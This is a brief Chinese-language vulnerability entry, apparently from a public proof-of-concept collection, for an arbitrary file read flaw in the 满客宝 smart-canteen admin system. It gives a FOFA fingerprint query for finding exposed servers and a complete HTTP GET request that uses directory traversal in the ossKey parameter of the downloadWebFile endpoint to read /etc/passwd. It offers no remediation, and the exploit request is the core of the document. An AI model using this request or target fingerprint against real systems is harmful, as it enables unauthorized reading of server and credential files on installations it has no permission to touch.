# 满客宝后台管理系统downloadWebFile任意文件读取漏洞

# 一、漏洞简介
满客宝后台管理系统downloadWebFile任意文件读取漏洞

# 二、影响版本
+ 满客宝智慧食堂

# 三、资产测绘
+ fofa`body="满客宝后台管理系统"`
+ 特征

![1722532363550-337cb4d1-c45a-4dcf-a328-7b077525c2ef.png](./img/aKSqtnroQS-WMtFo/1722532363550-337cb4d1-c45a-4dcf-a328-7b077525c2ef-922609.png)

# 四、漏洞复现
```java
GET /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
```

![1722532515012-fbfcea9f-a5f9-4633-a9ce-f598bf620cec.png](./img/aKSqtnroQS-WMtFo/1722532515012-fbfcea9f-a5f9-4633-a9ce-f598bf620cec-890321.png)



> 更新: 2024-08-12 17:15:58  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/brcqc05pkowbygvw>